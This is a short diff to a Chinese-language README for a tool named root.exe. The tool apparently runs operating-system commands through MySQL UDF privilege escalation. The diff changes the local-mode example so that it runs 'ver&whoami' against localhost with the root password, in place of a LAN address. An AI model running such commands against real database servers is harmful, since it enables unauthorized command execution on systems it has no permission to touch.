@@ -92,7 +92,7 @@ root.exe -a 192.168.1.105 -p root -m st
 本地模式：
 一般来说，php一般权限都是可以创建目录的，此处必须指定主机为`localhost或127.0.0.1`才会调用本地模式：
 ```
-root.exe -a 192.168.1.105 -p root -e "ver&whoami" -m udf
+root.exe -a localhost -p root -e "ver&whoami" -m udf
 ```
 
 ![Alt text](./pic/jqwhvdqhvhavshHHVJHV.png)
